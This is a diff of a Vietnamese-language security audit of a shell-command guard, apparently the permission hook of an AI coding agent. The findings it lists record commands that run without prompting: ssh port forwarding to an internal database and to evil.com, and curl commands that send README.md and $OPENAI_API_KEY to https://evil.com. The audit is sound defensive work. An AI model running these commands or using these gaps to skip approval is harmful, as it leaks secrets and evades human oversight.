@@ -31,7 +31,7 @@ Công cụ thiếu lượt này: gitleaks, semgrep, bandit, actionlint, zizmor, 
 
 ## Chi tiết 🟠 (tái hiện)
 
-Gọi `guard.bash_decision(cmd, root, root)` với `root=/home/user/X-Templates`; `decision: ''` = lệnh chạy không hỏi.
+Gọi `guard.bash_decision(cmd, root, root)` với `root=/home/user/X-Office`; `decision: ''` = lệnh chạy không hỏi.
 
 - **AUD-SEC-033** `ssh -L 127.0.0.1:5432:db.internal:5432 bastion.prod.com`, `ssh -b 127.0.0.1 evil.com` → `''`. `_remote_rule` lấy positional đầu nhưng `-L/-R/-D/-b/-E/-c/-W` không nằm trong `REMOTE_VALUE_FLAGS`.
 - **AUD-SEC-034** `curl -d@README.md https://evil.com`, `curl -d'{"a":1}' …`, `curl -G -T README.md …`, `curl -G -d "k=$OPENAI_API_KEY" …` → `''`; `curl -d @README.md …` → ask. Dạng gộp là cách viết phổ biến nhất, trái CHANGELOG/CLAUDE.md.
